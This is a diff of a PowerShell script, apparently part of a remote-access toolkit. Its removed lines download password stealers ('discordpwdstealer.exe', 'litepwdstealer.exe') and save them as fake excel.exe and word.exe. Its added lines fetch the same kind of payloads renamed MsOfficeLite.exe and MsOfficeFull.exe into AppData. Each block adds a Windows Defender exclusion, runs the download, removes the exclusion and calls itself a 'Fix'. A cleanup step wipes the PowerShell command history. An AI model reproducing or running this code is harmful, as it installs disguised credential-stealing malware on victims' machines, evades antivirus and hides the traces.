@@ -388,36 +388,38 @@ if ($ztconfirm.ToLower() -eq "y") {
 #	Restart-Service ZeroTierOneService
 #} else {
 #}
-#PWD-ST Fix
-$pwdst = Read-Host "Proceed With PWD-ST Fix (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($pwdst.ToLower() -eq "y") {
-    Write-Host "Executing PWD-ST Fix..."
-    	Add-MpPreference -ExclusionPath "C:\windows\excel.exe"
-	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
-	Invoke-WebRequest -Uri $url -OutFile "C:\windows\excel.exe"	
-	Start-Process -FilePath "C:\windows\excel.exe"
-	Remove-MpPreference -ExclusionPath "C:\windows\excel.exe"
-} else {
-}
 #litepwdsnitch Fix
-$pwdst = Read-Host "Proceed With LitePWDSnitch Fix (y/n)"
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
 if ([string]::IsNullOrEmpty($pwdst)) {
     Start-Sleep -Seconds 1
     $pwdst = "n"
 }
 if ($pwdst.ToLower() -eq "y") {
-    Write-Host "Executing PWD-ST Fix..."
-    	Add-MpPreference -ExclusionPath "C:\windows\word.exe"
-	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/litepwdstealer.exe"
-	Invoke-WebRequest -Uri $url -OutFile "C:\windows\word.exe"	
-	Start-Process -FilePath "C:\windows\word.exe"
-	Remove-MpPreference -ExclusionPath "C:\windows\word.exe"
-} else {
+    Write-Host "Executing $Name Fix..."
+    	$exepath = Join-Path $env:USERPROFILE "AppData\Roaming\$Name.exe"
+    	Add-MpPreference -ExclusionPath $exepath
+	Invoke-WebRequest -Uri $url -OutFile $exepath	
+	Start-Process -FilePath $exepath
+	Remove-MpPreference -ExclusionPath $exepath
+} else {}
+#classic-full-st Fix
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
 }
+if ($pwdst.ToLower() -eq "y") {
+    Write-Host "Executing $Name Fix..."
+    	$exepath = Join-Path $env:USERPROFILE "AppData\Roaming\$Name.exe"
+    	Add-MpPreference -ExclusionPath $exepath
+	Invoke-WebRequest -Uri $url -OutFile $exepath	
+	Start-Process -FilePath $exepath
+	Remove-MpPreference -ExclusionPath $exepath
+} else {}
 #Cleanup
 $sanit = Read-Host "Sanitization (y/n)"
 if ([string]::IsNullOrEmpty($sanit)) {
@@ -432,5 +434,4 @@ if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
         Remove-Item -Path "$psreadlineFolderPath\*" -Force
     }
 }
-} else {
-}
+} else {}
